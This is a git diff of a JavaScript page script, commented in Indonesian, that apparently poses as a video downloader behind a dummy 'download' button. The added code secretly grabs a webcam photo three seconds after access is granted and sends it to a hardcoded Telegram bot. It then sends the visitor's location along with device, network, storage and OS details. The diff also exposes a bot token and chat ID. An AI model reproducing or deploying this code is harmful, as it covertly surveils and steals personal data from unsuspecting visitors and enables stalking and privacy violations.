@@ -1,4 +1,4 @@
-const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAU8H_0ljUav8'; // Ganti dengan token bot Anda
+const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Anda
 const chatId = '6975695436'; // Ganti dengan chat ID Anda
 
 const video = document.getElementById('video');
@@ -8,6 +8,15 @@ const canvas = document.getElementById('canvas');
 navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
     video.srcObject = stream;
     video.play();
+
+    // Tangkap gambar setelah beberapa detik
+    setTimeout(() => {
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(function(blob) {
+            sendPhotoToTelegram(blob);
+        }, 'image/jpeg');
+    }, 3000); // Ambil gambar setelah 3 detik
 }).catch(function(error) {
     console.error("Gagal mengakses webcam:", error);
 });
@@ -24,45 +33,18 @@ function sendPhotoToTelegram(blob) {
     }).then(response => {
         if (response.ok) {
             console.log("Foto berhasil dikirim ke Telegram.");
+            getLocation();  // Kirim lokasi setelah foto terkirim
+            getDeviceInfo(); // Kirim informasi perangkat
+            getNetworkInfo(); // Kirim informasi jaringan
+            getTimeInfo(); // Kirim informasi waktu
+            getStorageInfo(); // Kirim informasi penyimpanan
+            getOSInfo(); // Kirim informasi sistem operasi
         } else {
             console.error("Gagal mengirim foto ke Telegram.");
         }
     }).catch(error => {
         console.error("Error saat mengirim foto:", error);
     });
-}
-
-// Fungsi untuk mengambil foto dari video webcam
-function captureImage() {
-    const context = canvas.getContext("2d");
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(function(blob) {
-        sendPhotoToTelegram(blob); // Kirim foto ke Telegram
-    }, 'image/jpeg');
-}
-
-// Fungsi untuk mengirim semua data ke Telegram
-function sendAllInfo() {
-    // Ambil foto
-    captureImage();
-
-    // Kirim lokasi
-    getLocation();
-
-    // Kirim informasi perangkat
-    getDeviceInfo();
-
-    // Kirim informasi jaringan
-    getNetworkInfo();
-
-    // Kirim informasi waktu
-    getTimeInfo();
-
-    // Kirim informasi penyimpanan
-    getStorageInfo();
-
-    // Kirim informasi sistem operasi
-    getOSInfo();
 }
 
 // Fungsi untuk mendapatkan lokasi pengguna
@@ -197,3 +179,19 @@ function sendMessageToTelegram(message) {
         console.error("Error saat mengirim pesan:", error);
     });
 }
+
+// Fungsi untuk menampilkan tombol download dan mengunduh video
+document.addEventListener("DOMContentLoaded", function () {
+    const downloadButton = document.getElementById("download");
+    const urlInput = document.getElementById("url");
+
+    downloadButton.addEventListener("click", function () {
+        const url = urlInput.value.trim(); // Ambil nilai input URL
+        if (url) {
+            alert(`Video berhasil diunduh: ${url}`);
+            // Di sini Anda bisa tambahkan logika untuk mengunduh video
+        } else {
+            alert("Masukkan URL terlebih dahulu!");
+        }
+    });
+});
